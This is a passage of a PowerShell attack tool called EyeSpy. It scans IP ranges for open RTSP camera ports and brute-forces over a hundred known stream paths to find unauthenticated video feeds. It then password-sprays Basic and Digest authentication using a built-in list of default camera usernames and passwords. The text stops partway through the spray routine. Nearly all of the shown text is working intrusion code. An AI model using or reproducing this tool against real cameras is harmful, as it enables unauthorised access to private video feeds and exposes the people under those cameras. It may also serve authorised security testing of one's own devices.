function EyeSpy {
    [CmdletBinding(DefaultParameterSetName = 'Default')]
    Param(
        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$Search,
        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$NoAuth,
        [Parameter(Mandatory = $False, ParameterSetName = 'AuthAttack')]
        [String]$AuthAttack,
        [Parameter(Mandatory = $False, ParameterSetName = 'AuthAttack')]
        [String]$Path,
        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$Auto,
        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [ValidateRange(10, 2000)]
        [int]$Timeout = 200,
        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [Switch]$Help

    )

    if ($Help) {

        $HelpOutput = @("
========================================================================================================
               
========================================================================================================
                                 _______             _______             
                                |    ___.--.--.-----|     __.-----.--.--.
                                |    ___|  |  |  -__|__     |  _  |  |  |
                                |_______|___  |_____|_______|   __|___  |
                                        |_____|             |__|  |_____|   
                                
========================================================================================================
                                By: Miiden
========================================================================================================
 
Check GitHub for more detailed descriptions.

General Usage Parameters:
+======================================================================================================+
|     Parameter     |   Value    |                  Description                                        |
+===================+============+=====================================================================+
|      -Search      | IP(/Range) | Scans the provided IP/Range for Open RTSP Ports.                    |
|      -NoAuth      | IP(/Range) | Checks the provided IP/Range if authentication is required.         |
|       -Auto       | IP(/Range) | All of the above automatically.                                     |
+===================+============+=====================================================================+
|    -AuthAttack    | IP:Port    | Performs a Password spray attack on provided targets.               |
|       -Path       | 'Path'     | Requires -AuthAttack, Set a Known Path to Attack                    |
+======================================================================================================+

Optional Parameters:
+======================================================================================================+
|     Parameter     |   Value    |                  Description                                        |
+===================+============+=====================================================================+
| -Timeout          | (10-2000)  | (Default: 200) Set Global Receive Timeout Value.                    |
| -Help             |    N/A     | Shows this Help.                                                    |
+======================================================================================================+

Example Usage:

# Search for common open RTSP ports on a single IP or across a range.
  EyeSpy -Search 192.168.0.1/24

# Searches for common open RTSP ports and checks common paths if authentication is required.
  EyeSpy -NoAuth 192.168.0.123
 
# Performs a password spraying attack with common credentials on a known open IP:Port
  EyeSpy -AuthAttack 192.168.0.13:8554

# Performs a password spraying attack with common credentials on a known open IP:Port/Path
  EyeSpy -AuthAttack 192.168.0.200:554 -Path 'MyStream'

# Performs all of the above automatically across a single IP or Range
  Eyespy -Auto 192.168.0.1/24

# Shows this help message
  Eyespy -Help

========================================================================================================
")

        $HelpOutput | Write-Output
        return

    }

    $Banner = @("
=========================================================
                
=========================================================
         _______             _______             
        |    ___.--.--.-----|     __.-----.--.--.
        |    ___|  |  |  -__|__     |  _  |  |  |
        |_______|___  |_____|_______|   __|___  |
                |_____|             |__|  |_____|   
                                
=========================================================
                By: Miiden
=========================================================
    ")

    if (!$Search -and !$Auto -and !$NoAuth -and !$AuthAttack) {
    
        Write-Host
        Write-Host "[!] " -ForegroundColor "Red" -NoNewline
        Write-Host "You must Use either -Search, -NoAuth, -AuthAttack or -Auto"
    
        Write-Host "[!] " -ForegroundColor "Red" -NoNewline
        Write-Host "Run ""EyeSpy -Help"" for command line usage"
        Write-Host
    
        return
    
    }


$Banner
Write-Host "Options:`r`n"
Write-Host -NoNewline -ForegroundColor Yellow "[#]"
Write-Host -NoNewline " Global Receive Timeout Set To`: "
Write-Host -ForegroundColor Magenta "$Timeout`r`n"
Write-Host "=========================================================`r`n"

function Get-IpRange {
    [CmdletBinding(ConfirmImpact = 'None')]
    Param(
        [Parameter(Mandatory, ValueFromPipeline, Position = 0)]
        [string[]] $Target
    )

    process {
        $Computers = @()
        foreach ($subnet in $Target) {
            if ($subnet -match '^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}$') {
                # Treat as a single IP address
                $Computers += $subnet
            }
            elseif ($subnet -match '^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}/\b(1[6-9]|2[0-9]|3[0-2])\b$') {
                # CIDR notation processing
                $IP = ($subnet -split '\/')[0]
                [int]$SubnetBits = ($subnet -split '\/')[1]
                if ($SubnetBits -lt 16 -or $SubnetBits -gt 30) {
                    Write-Warning -Message 'Enter a CIDR value between 16 and 30'
                    break 2
                }
                $Octets = $IP -split '\.'
                $IPInBinary = @()
                foreach ($Octet in $Octets) {
                    $OctetInBinary = [convert]::ToString($Octet, 2).PadLeft(8, '0')
                    $IPInBinary += $OctetInBinary
                }
                $IPInBinary = $IPInBinary -join ''
                $HostBits = 32 - $SubnetBits
                $NetworkIDInBinary = $IPInBinary.Substring(0, $SubnetBits)

                $imax = [convert]::ToInt32(('1' * $HostBits), 2) - 1 # -1 to remove broadcast address
                For ($i = 1; $i -le $imax; $i++) {
                    $NextHostIDInDecimal = $i
                    $NextHostIDInBinary = [convert]::ToString($NextHostIDInDecimal, 2).PadLeft($HostBits, '0')
                    $NextIPInBinary = $NetworkIDInBinary + $NextHostIDInBinary
                    $IP = @()
                    For ($x = 0; $x -lt 4; $x++) {
                        $StartCharNumber = $x * 8
                        $IPOctetInBinary = $NextIPInBinary.Substring($StartCharNumber, 8)
                        $IPOctetInDecimal = [convert]::ToInt32($IPOctetInBinary, 2)
                        $IP += $IPOctetInDecimal
                    }
                    $IP = $IP -join '.'
                    $Computers += $IP
                }
            }
            else {
                Write-Host -ForegroundColor red "Value`: [$subnet] is not in a valid format"
                return
            }
        }
        # Remember: Only returns an IP list, not active hosts.
        return $Computers
    }
}

function GenerateDigest {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory)]
        [string]$username,
        [Parameter(Mandatory)]
        [string]$password,
        [Parameter(Mandatory)]
        [string]$realm,
        [Parameter(Mandatory)]
        [string]$uri,
        [Parameter(Mandatory)]
        [string]$nonce
    )

        # Goal is to create this:
        # $finalResponse = MD5(username:realm:password):nonce:MD5(method:uri)
        
        # Concatenate username, realm, and password with colon (:) separator
        $userRealmPass = "$username`:$realm`:$password"

        # Calculate MD5 hash of username:realm:password
        $userRealmPassHash = [System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($userRealmPass))
        $hash1 = [System.BitConverter]::ToString($userRealmPassHash) -replace '-', ''
        $URPhash = $hash1.toLower()

        # Concatenate method and URI with colon (:) separator
        $methodUri = "DESCRIBE`:$uri"

        # Calculate MD5 hash of method:uri
        $methodUriHash = [System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($methodUri))
        $hash2 = [System.BitConverter]::ToString($methodUriHash) -replace '-', ''
        $MUhash = $hash2.toLower()

        # Concatenate MD5 hash of username:realm:password, nonce, and MD5 hash of method:uri with colon (:) separator
        $responseString = "$URPhash`:$nonce`:$MUhash"

        # Calculate MD5 hash of concatenated string
        $responseHash = [System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($responseString))
        $responseHashHex = [System.BitConverter]::ToString($responseHash) -replace '-', ''

        $finalResponse = $responseHashHex.ToLower()
        
        return $finalResponse

}

function Get-OpenRTSPPorts {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory, ValueFromPipeline)]
        [string[]]$IPAddress
    )

    Write-Host "Checking for IPs with Open RTSP Ports:`r`n"
    $openPorts = [System.Collections.Concurrent.ConcurrentBag[PSCustomObject]]::new()
    $lock = New-Object System.Object

    # Create the runspace pool
    $runspacePool = [runspacefactory]::CreateRunspacePool(1, [System.Environment]::ProcessorCount)
    $runspacePool.Open()

    $runspaces = foreach ($ip in $IPAddress) {
        $runspace = [powershell]::Create().AddScript({
            param ($ip, $ports, $openPorts, $lock)

            foreach ($port in $ports) {
                try {
                    $tcpClient = [System.Net.Sockets.TcpClient]::new()
                    $tcpClient.SendTimeout = 100
                    $tcpClient.ReceiveTimeout = 100
                    $awaitResult = $tcpClient.BeginConnect($ip, $port, $null, $null)
                    $success = $awaitResult.AsyncWaitHandle.WaitOne(100, $false)

                    if ($success) {
                        $tcpClient.EndConnect($awaitResult)
                        if ($tcpClient.Connected) {
                            [void]$openPorts.Add([PSCustomObject]@{
                                IPAddress = $ip
                                Port      = $port
                                Status    = "Open"
                            })

                            lock ($lock) {
                                # No need for additional logic here
                            }
                        }
                    }
                } catch {
                    # Do nothing
                } finally {
                    if ($tcpClient.Connected) {
                        $tcpClient.Close()
                        $tcpClient.Dispose()
                    }
                }
            }
        }).AddArgument($ip).AddArgument((554, 8554, 5554)).AddArgument($openPorts).AddArgument($lock)

        $runspace.RunspacePool = $runspacePool
        [PSCustomObject]@{ Pipe = $runspace; Status = $runspace.BeginInvoke() }
    }

    # Ensure all runspaces are properly closed and disposed of
    try {
        $runspacesCompleted = $runspaces | ForEach-Object {
            try {
                $_.Pipe.EndInvoke($_.Status)
            } catch {
                Write-Error "Error ending invoke: $_"
            } finally {
                $_.Pipe.Dispose()
            }
        }
    } finally {
        try {
            $runspacePool.Close()
        } catch {
            Write-Error "Error closing runspace pool: $_"
        } finally {
            $runspacePool.Dispose()
        }
    }

    $validIPPorts = $openPorts | ForEach-Object {
        if ($_.Status -eq "Open") {
            [PSCustomObject]@{
                IPAddress = $_.IPAddress
                Port      = $_.Port
                Status    = "Open"
            }
        }
    }

    if ($validIPPorts.Count -eq 0) {
        Write-Host -NoNewline -ForegroundColor Red "[-]"
        Write-Host -NoNewline " No Open RTSP Ports detected.`r`n"
        return @()
    }

    Write-Host -NoNewline -ForegroundColor Green "`r`n[+]"
    Write-Host " Valid IPs With Open Ports Discovered.`r`n"
    Write-Host "========================================================="

    foreach ($result in $validIPPorts) {
        Write-Host -NoNewline -ForegroundColor Green "[+]"
        Write-Host -NoNewline " Open: "
        Write-Host -ForegroundColor Green "$($result.IPAddress):$($result.Port)"
    }

    return $validIPPorts
}

function Get-AuthType {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory)]
        [PSCustomObject[]]$OpenPorts
    )

    # Use 1st Fake Route, to try and determine auth type, if that fails use a few common ones to try and find the auth type.
    # Namely, Fake, Axis, Dahua, Hikvision
    $authTestPath = @("TWlpZGVu", "axis-media/media.amp", "cam/realmonitor", "Streaming/Channels/101")
    $foundAuth = @()

    Write-Host "`r`nChecking for Auth Types`:`r`n"

    foreach ($openPort in $OpenPorts) {    
        $ip = $openPort.IPAddress
        $port = $openPort.Port
        $authDetected = $false
        $unknownAuth = $false

        foreach ($testPath in $authTestPath) {
            if ($authDetected) { break }  # Exit inner loop if auth type found

            $authtyperesult = @()
            $CRLF = [char]13 + [char]10

            $request = "DESCRIBE rtsp://$ip`:$port/$testPath RTSP/1.0$CRLF" +
                       "CSeq: 1$CRLF$CRLF"

            try {
                $tcpClient = New-Object System.Net.Sockets.TcpClient
                $tcpClient.ReceiveTimeout = $Timeout
                $tcpClient.Connect($ip, $port)

                $stream = $tcpClient.GetStream()
                $writer = New-Object System.IO.StreamWriter($stream)
                $writer.Write($request)
                $writer.Flush()

                $reader = New-Object System.IO.StreamReader($stream)
                $statusLine = $reader.ReadLine()

                while (!$reader.EndOfStream) {
                    $response = $reader.ReadLine()

                    if ($response -match "(?i)\bdigest\b") {
                        Write-Host -ForegroundColor Yellow -NoNewline "Found Digest`: "
                        Write-Host "$ip`:$port"
                        $authtyperesult += [PSCustomObject]@{
                            IPAddress = $ip
                            Port      = $port
                            Status    = "Open"
                            authType  = "Digest"
                        }
                        $authDetected = $true
                        break  # Exit inner loop if auth type found
                    } elseif ($response -match "(?i)\bbasic\b") {
                        Write-Host -ForegroundColor Yellow -NoNewline "Found Basic`: "
                        Write-Host "$ip`:$port"
                        $authtyperesult += [PSCustomObject]@{
                            IPAddress = $ip
                            Port      = $port
                            Status    = "Open"
                            authType  = "Basic"
                        }
                        $authDetected = $true
                        break  # Exit inner loop if auth type found
                    } elseif ($response -match "(404 Not Found)") {
                        $unknownAuth = $true
                        #Write-Host -ForegroundColor Yellow -NoNewline "Auth Type Not Found, Testing Next Path For`: "
                        #Write-Host "$ip`:$port"
                    }
                }
            } catch {
                #Write-Warning "An error occurred: $_"
            } finally {
                if ($tcpClient.Connected) {
                    $tcpClient.Dispose()
                }
            }

            if ($authtyperesult.Count -eq 0 -and !$unknownAuth) {
                Write-Host -ForegroundColor Yellow -NoNewline "Found NoAuth`: "
                Write-Host "$ip`:$port"
                $foundAuth += [PSCustomObject]@{
                    IPAddress = $ip
                    Port      = $port
                    Status    = "Open"
                    authType  = "none"
                }
            } elseif ($unknownAuth -and ($authtyperesult.Count -eq 0)) {
                # Do nothing, continue to the next path
            } else {
                $foundAuth += $authtyperesult
            }
        }

        if ($unknownAuth -and !$authDetected) {
            Write-Host -ForegroundColor Yellow -NoNewline "Unknown Auth`: "
            Write-Host "$ip`:$port"
            $foundAuth += [PSCustomObject]@{
                IPAddress = $ip
                Port      = $port
                Status    = "Open"
                authType  = "Unknown"
            }
        }
    }

    Write-Host -NoNewline -ForegroundColor Green "`r`n[+]"
    Write-Host " Found Required Auth Types`r`n"
    Write-Host "=========================================================`r`n"

    return $foundAuth
}

function Get-ValidRTSPPaths {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory)]
        [PSCustomObject[]]$OpenPorts
    )

    $Paths = @( "", "0/1", "0/video1", "1", "axis-media/media.amp","cam/realmonitor","Streaming/Channels/101",
    "1.AMP", "1/h264major", "1/main", "1/stream1", "1080p", "11", "12", "125", "1440p", "480p", "4K", "666", 
    "720p", "access_code", "access_name_for_stream_1_to_5","api/mjpegvideo.cgi", "av0_0", "av2", "avc", "avn=2",
    "AVStream1_1", "axis-media/media.amp?camera=1", "axis-media/media.amp?videocodec=h264", "cam",
    "cam/realmonitor?channel=0&subtype=0", "cam/realmonitor?channel=1&subtype=0", "cam/realmonitor?channel=1&subtype=1",
    "cam/realmonitor?channel=1&subtype=1&unicast=true&proto=Onvif", "CAM_ID.password.mp2", "cam0", "cam0_0", "cam0_1",
    "cam1", "cam1/h264", "cam1/h264/multicast", "cam1/mjpeg", "cam1/mpeg4", "cam1/mpeg4?user='username'&pwd='password'",
    "cam1/onvif-h264", "camera.stm", "ch0", "ch0_0.h264", "ch0_unicast_firststream", "ch0_unicast_secondstream",
    "ch00/0", "ch001.sdp", "CH001.sdp", "ch01.264", "ch01.264?", "ch01.264?ptype=tcp", "ch1/0", "ch1_0", "ch1-s1",
    "ch2/0", "ch2_0", "ch3/0", "ch3_0", "ch4/0", "ch4_0", "channel1", "GetData.cgi", "gnz_media/main", "h264",
    "h264.sdp", "h264/ch1/sub/av_stream","h264/media.amp", "h264_stream", "h264_vga.sdp", "h264Preview_01_main",
    "h264Preview_01_sub", "HD", "HighResolutionVideo", "image.mpg", "img/media.sav", "img/media.sav?channel=1",
    "img/video.asf", "img/video.sav", "ioImage/1", "ipcam.sdp", "ipcam_h264.sdp", "ipcam_mjpeg.sdp", "live",
    "live.sdp", "live/av0", "live/ch0", "live/ch00_0", "live/ch01_0", "live/ch01_0", "live/h264", "live/main",
    "live/main0", "live/mpeg4", "live_mpeg4.sdp", "live_st1", "live1.sdp", "live3.sdp", "livestream",
    "LowResolutionVideo", "main", "media", "media.amp", "media.amp?streamprofile=Profile1", "media/media.amp",
    "media/video1", "MediaInput/h264", "MediaInput/mpeg4", "medias2", "mjpeg/media.smp", "mp4", "mpeg/media.amp",
    "mpeg4", "mpeg4/1/media.amp", "mpeg4/media.amp", "mpeg4/media.smp", "mpeg4unicast", "mpg4/rtsp.amp",
    "multicaststream", "now.mp4", "nph-h264.cgi", "nphMpeg4/g726-640x", "nphMpeg4/g726-640x48", "nphMpeg4/g726-640x480",
    "nphMpeg4/nil-320x240", "ONVIF/MediaInput", "onvif1", "onvif-media/media.amp", "play1.sdp", "play2.sdp",
    "profile1/media.smp", "profile2/media.smp", "profile5/media.smp", "rtpvideo1.sdp", "rtsp_live0", "rtsp_live1",
    "rtsp_live2", "rtsp_tunnel", "rtsph264", "rtsph2641080p", "snap.jpg", "StdCh1", "stream", "stream.sdp", "stream/0",
    "stream/1", "stream/live.sdp", "stream1", "streaming/channels/0", "streaming/channels/1", "Streaming/Channels/1",
    "Streaming/Unicast/channels/101", "tcp/av0_0", "test", "tmpfs/auto.jpg", "trackID=1",
    "ucast/11", "udpstream", "user.pin.mp2", "v2", "video", "video.3gp", "video.h264", "video.mjpg", "video.mp4",
    "video.pro1", "video.pro2", "video.pro3", "video0", "video0.sdp", "video1", "video1.sdp", "VideoInput/1/h264/1",
    "VideoInput/1/mpeg4/1", "videoinput_1/h264_1/media.stm", "videoMain", "videostream.asf", "vis", "wfov"
    )
    
    $authRequiredPaths = @()
    
    Write-Host "`r`nChecking for valid RTSP Paths:`r`n"

    foreach ($openPort in $OpenPorts) {
            $ip = $openPort.IPAddress
            $port = $openPort.Port
            $authType = $openPort.authType
            $validPathFound = $false



        foreach ($path in $Paths) {
            if ($validPathFound) { continue }  # Skip if a valid path is already found

            $CRLF = [char]13 + [char]10
            $request = "DESCRIBE rtsp://$ip`:$port/$path RTSP/1.0$CRLF" +
                       "CSeq: 1$CRLF$CRLF"

            try {
                $tcpClient = New-Object System.Net.Sockets.TcpClient
                $tcpClient.ReceiveTimeout = $Timeout
                $tcpClient.Connect($ip, $port)

                $stream = $tcpClient.GetStream()
                $writer = New-Object System.IO.StreamWriter($stream)
                $writer.Write($request)
                $writer.Flush()

                $reader = New-Object System.IO.StreamReader($stream)
                $statusLine = $reader.ReadLine()

                if ($statusLine -match 'RTSP/1.0 200 OK') {
                    Write-Host -NoNewline -ForegroundColor Green "[+]"
                    Write-Host -NoNewline " No Auth Required`: "
                    Write-Host -ForegroundColor Green "$ip`:$port/$path"
                    $validPathFound = $true
    
                }
                elseif ($statusLine -match 'RTSP/1.0 401 Unauthorized' -or $statusLine -match 'RTSP/1.0 403 Forbidden') {
                    $authRequiredPaths += [PSCustomObject]@{
                        IPAddress = $ip
                        Port      = $port
                        Path      = $path
                        authType  = $authType
                    }
                }
            }
            catch {
                Write-Warning "An error occurred: $_"
            }
            finally {
                if ($tcpClient.Connected) {
                    $tcpClient.Dispose()
                }
            }
        }
    }

    Write-Host -NoNewline -ForegroundColor Green "`r`n[+]"
    Write-Host " Potential Paths Found!`r`n"
    Write-Host "=========================================================`r`n"
    return $authRequiredPaths
}

function GenerateCreds {
    $UserList = @("Admin", "admin", "admin1", "administrator", "Administrator",
                "aiphone", "root", "Root", "service", "supervisor", "ubnt"
                )

    $PassList = @("", "0000", "00000", "1111", "111111", "1111111",
                "123", "1234", "12345", "123456", "1234567", "12345678",
                "123456789", "12345678910", "4321", "666666", "6fJjMKYx",
                "888888", "9999", "admin", "admin pass", "Admin", "admin123",
                "administrator", "Administrator", "aiphone", "camera",
                "Camera", "fliradmin", "GRwvcj8j", "hikvision", "hikadmin",
                "HuaWei123", "ikwd", "jvc", "kj3TqCWv", "meinsm", "pass",
                "Pass", "password", "password123", "qwerty", "qwerty123",
                "Recorder", "reolink", "root", "service", "supervisor",
                "support", "system", "tlJwpbo6", "toor", "tp-link", "ubnt",
                "user", "wbox", "wbox123", "Y5eIMz3C"
                )

    $authString = @()

    foreach ($user in $UserList){
        foreach ($pass in $PassList) {
            $authString += [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$user`:$pass")) 
        }              
    }

    return $authString
}

function Get-ValidRTSPCredential {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory)]
        [string]$IP,
        [Parameter(Mandatory)]
        [int]$Port,
        [Parameter(Mandatory)]
        [string]$Path,
        [Parameter(Mandatory)]
        [string[]]$authType
    )

    $credentials = GenerateCreds
    $parentActivity = "Checking`: $IP`:$Port/$Path"
    $parentStatus = "Starting"
    $parentId = Get-Random

    $credentialStep = 0
    $totalCredentials = $Credentials.Count

    foreach ($cred in $Credentials) {
        $credentialStep++
        $childActivity = "Trying credential $($credentialStep)/$totalCredentials"
        $childStatus = "Working"
        $childId = Get-Random

        $parentProgress = [math]::Floor(($credentialStep / $totalCredentials) * 100)
        Write-Progress -Id $parentId -Activity $parentActivity -Status $parentStatus -PercentComplete $parentProgress -CurrentOperation $childActivity -SecondsRemaining (-1)

        if ($authType -eq "Digest"){
            # Use Digest Auth Mode
            $validCred = Test-DigestRTSPAuth -IP $IP -Port $Port -Path $Path -Credential $cred
        } elseif ($authType -eq "Basic") {
            # Use Basic Auth Mode
            $validCred = Test-BasicRTSPAuth -IP $IP -Port $Port -Path $Path -Credential $cred
        } elseif ($authType -eq "Unknown"){
            # At the moment, if an Unknown Auth Type is detected in the initial AuthType Checks (hopefully not) It just resorts to checking Basic Auth
            # Further checks/attacks need to be implimented here.
            $validCred = Test-BasicRTSPAuth -IP $IP -Port $Port -Path $Path -Credential $cred
        }

        if ($validCred) {
            Write-Progress -Id $parentId -Activity $parentActivity -Status "Success" -PercentComplete 100 -Completed
            Write-Progress -Id $childId -Activity $childActivity -Status "Success" -PercentComplete 100 -Completed -ParentId $parentId

            return [PSCustomObject]@{
                Credential = $validCred
                CredentialFound = $true
            }
        } else {
            $childStatus = "Failed"
            Write-Progress -Id $childId -Activity $childActivity -Status $childStatus -PercentComplete 100 -Completed -ParentId $parentId
        }
    }

    Write-Progress -Id $parentId -Activity $parentActivity -Status "Failed" -PercentComplete 100 -Completed

    return [PSCustomObject]@{
        Credential = $null
        CredentialFound = $false
    }
}

function Test-BasicRTSPAuth {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory)]
        [string]$IP,
        [Parameter(Mandatory)]
        [int]$Port,
        [Parameter(Mandatory)]
        [string]$Path,
        [Parameter(Mandatory)]
        [string]$Credential
    )

    $CRLF = [char]13 + [char]10

    $request = "DESCRIBE rtsp://$IP`:$Port/$Path RTSP/1.0$CRLF" +
               "CSeq: 2$CRLF" +
               "Authorization: Basic $Credential$CRLF$CRLF"

    try {
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $tcpClient.ReceiveTimeout = $Timeout
        $tcpClient.Connect($IP, $Port)

        $stream = $tcpClient.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.Write($request)
        $writer.Flush()

        $reader = New-Object System.IO.StreamReader($stream)
        $statusLine = $reader.ReadLine()

        if ($statusLine -match 'RTSP/1.0 200 OK') {
            $reader.Dispose()
            $writer.Dispose()
            $stream.Dispose()
            $tcpClient.Dispose()

            $credentials = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Credential))
            return $credentials
        }
        elseif ($statusLine -match 'RTSP/1.0 401 Unauthorized' -or $statusLine -match 'RTSP/1.0 403 Forbidden') {
            $reader.Dispose()
            $writer.Dispose()
            $stream.Dispose()
            $tcpClient.Dispose()    
        }
    }
    catch [System.Net.Sockets.SocketException] {
        Write-Warning "Connection refused by $IP`:$Port Waiting 30s before continuing."
        Start-Sleep -Seconds 30
    }
    catch {
       # Error catch for debugging, usually non url compliant path.
       # Write-Warning "An error occurred: $_"
    }
    finally {
        if ($tcpClient.Connected) {
            $tcpClient.Dispose()
        }
    }

    return $null
}

function Test-DigestRTSPAuth {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory)]
        [string]$IP,
        [Parameter(Mandatory)]
        [int]$Port,
        [Parameter(Mandatory)]
        [string]$Path,
        [Parameter(Mandatory)]
        [string]$Credential
    )

    $decodedCredentials = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Credential))
    $usrpass = $decodedCredentials.split(':')
    $username = $usrpass[0]
    $password = $usrpass[1]
    
    $CRLF = [char]13 + [char]10
    
    try {
        [int]$CSeq = 1

        $request = "DESCRIBE rtsp://$IP`:$Port/$Path RTSP/1.0$CRLF" +
                   "CSeq: $CSeq$CRLF$CRLF"

        $uri = "rtsp://$IP`:$Port/$Path"
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $tcpClient.ReceiveTimeout = 4  # Set a specifically low timeout due to issue with reading 200 response.
        $tcpClient.Connect($IP, $Port)

        $stream = $tcpClient.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.Write($request)
        $writer.Flush()

        $reader = New-Object System.IO.StreamReader($stream)
        
        $digestProcessed = $false

        while (!$reader.EndOfStream -and !$digestProcessed) {
            $response = $reader.ReadLine()

            # Check for Digest Authentication
            if ($response -match "(?i)\bDigest\b") {
                # Pluck out the Realm and Nonce for creating a response
                $realm = if ($response -match 'realm="([^"]+)"') { $matches[1] } else { $null }
                $nonce = if ($response -match 'nonce="([^"]+)"') { $matches[1] } else { $null }
                # Create the response
                $DigestResponse =  GenerateDigest -username $username -password $password -realm $realm -uri $uri -nonce $nonce
                # Up the Cseq number
                $CSeq ++

                # Construct the second request
                $request2 = "DESCRIBE rtsp://$IP`:$Port/$Path RTSP/1.0$CRLF" +
                            "CSeq: $CSeq$CRLF" +
                            "Authorization: Digest username=`"$username`", password=`"$password`", realm=`"$realm`", nonce=`"$nonce`", uri=`"rtsp://$IP`:$Port/$Path`", response=`"$DigestResponse`"$CRLF$CRLF"
                
                # Send it
                $writer.Write($request2)
                $writer.Flush()

                #################################################
                ######## Speed issue is here at the moment ######
                #################################################
                
                # Start reading responses for 200 OK
                while (!$reader.EndOfStream) {
                    $responseLine = $reader.ReadLine()

                    if ($responseLine -match 'RTSP/1.0 200 OK') {
                        $digestProcessed = $true
                        return $decodedCredentials # Return the decoded Creds once 200 OK is received
                    }
                }

                $digestProcessed = $true
            }

        }

    }
    catch [System.Net.Sockets.SocketException] {
        Write-Warning "Connection refused by $IP`:$Port Waiting 30s before continuing."
        Start-Sleep -Seconds 30
    }
    catch {
       # Error catch for debugging, usually non url compliant path.
       # Write-Warning "An error occurred: $_"
    }
    finally {
        if ($tcpClient.Connected) {
            $tcpClient.Dispose()
        }
    }

    return $null
}

function Scan {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory)]
        [string]$Targets
        )

    $ipRange = Get-IpRange -Target $Targets
    $antiSpam = Get-OpenRTSPPorts -IPAddress $ipRange

    Write-Host "`r`nScan completed.`r`n" -ForegroundColor Green
    Write-Host "=========================================================`r`n"
   
}

function NoAuthScan {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory)]
        [string]$Targets
    )

    $ipRange = Get-IpRange -Target $Targets
    $openPorts = Get-OpenRTSPPorts -IPAddress $ipRange

    # Check if there are any unique IP addresses with open ports
    $uniqueIPsWithOpenPorts = $openPorts | Select-Object -ExpandProperty IPAddress -Unique

    if ($uniqueIPsWithOpenPorts.Count -gt 0) {
    
       $variableToStopSpam = Get-ValidRTSPPaths -OpenPorts $openPorts
    }
    
    Write-Host "`r`nScan completed.`r`n" -ForegroundColor Green
    Write-Host "=========================================================`r`n"
}

function AuthAttack {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory)]
        [string]$Target,
        [Parameter(Mandatory = $False)]
        [string]$Path
    )

    $ipAndPort = $Target.Split(':')
    $ip = $ipAndPort[0]
    $port = $ipAndPort[1]

    try {
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $tcpClient.SendTimeout = 100
        $tcpClient.ReceiveTimeout = $Timeout
        $awaitResult = $tcpClient.BeginConnect($ip, $port, $null, $null)
        $success = $awaitResult.AsyncWaitHandle.WaitOne(100, $false)

        if ($success) {
            $tcpClient.EndConnect($awaitResult)
            if ($tcpClient.Connected) {
                Write-Host -NoNewline -ForegroundColor Green "[+]"
                Write-Host -NoNewline " Open: "
                Write-Host -ForegroundColor Green "$ip`:$port"
                $cliaddress += [PSCustomObject]@{
                    IPAddress = $ip
                    Port      = $port
                    Status    = "Open"
                }
                $tcpClient.Close()
            }
        } else {
            Write-Host -NoNewline -ForegroundColor Red "[!]"
            Write-Host -NoNewline " Not Open: "
            Write-Host -ForegroundColor Red "$ip`:$port"
            return
        }
    }
    catch {
        Write-Warning "An error occurred: $_"
        return
    }

    # Check if the Path parameter was provided and if it's blank or "/"
    if ($PSBoundParameters.ContainsKey('Path')) {
        if ($Path -eq "" -or $Path -eq "/") {
            # Handle the case where Path is explicitly blank or "/"
            Write-Host "Testing blank path..." -ForegroundColor Yellow

            $getAuth = Get-AuthType -OpenPorts $cliaddress
            $authRequiredPaths = [PSCustomObject]@{
                IPAddress = $ip
                Port      = $port
                Path      = ""  # Set blank path for testing
                AuthType  = $getAuth.authType
            }
        }
        else {
            # Handle case where a valid path is provided
            $getAuth = Get-AuthType -OpenPorts $cliaddress
            $authRequiredPaths = [PSCustomObject]@{
                IPAddress = $ip
                Port      = $port
                Path      = $Path
                AuthType  = $getAuth.authType
            }
        }
    }
    else {
        # No Path provided, brute force the paths
        Write-Host "No Path provided, brute-forcing paths..." -ForegroundColor Yellow
        $getAuth = Get-AuthType -OpenPorts $cliaddress
        $AuthConstruct = [PSCustomObject]@{
            IPAddress = $ip
            Port      = $port
            AuthType  = $getAuth.authType
        }
        $authRequiredPaths = Get-ValidRTSPPaths -OpenPorts $AuthConstruct
    }

    # Continue with password spraying logic...
    if ($authRequiredPaths -is [System.Array]) {
        if ($authRequiredPaths.Count -gt 0) {
            Write-Host "=========================================================`r`n"
            Write-Host "Beginning Password Spray:`r`n"

            $index = 0
            while ($index -lt $authRequiredPaths.Count) {
                $authPath = $authRequiredPaths[$index]

                $result = Get-ValidRTSPCredential -IP $authPath.IPAddress -Port $authPath.Port -Path $authPath.Path -authType $authPath.authType

                if ($result.CredentialFound) {
                    $validCredentials += [PSCustomObject]@{
                        IPAddress   = $authPath.IPAddress
                        Port        = $authPath.Port
                        Path        = $authPath.Path
                        Credentials = $result.Credential
                    }

                    Write-Host -ForegroundColor Yellow -NoNewline "====="
                    Write-Host -NoNewline " Found Credentials "
                    Write-Host -ForegroundColor Yellow "====="

                    Write-Host -NoNewline -ForegroundColor Green  "[+] "
                    $authString = $authPath.IPAddress + ":" + $authPath.Port + "/" + $authPath.Path
                    Write-Host "Path: $authString"
                    Write-Host -NoNewline -ForegroundColor Green  "[+] "
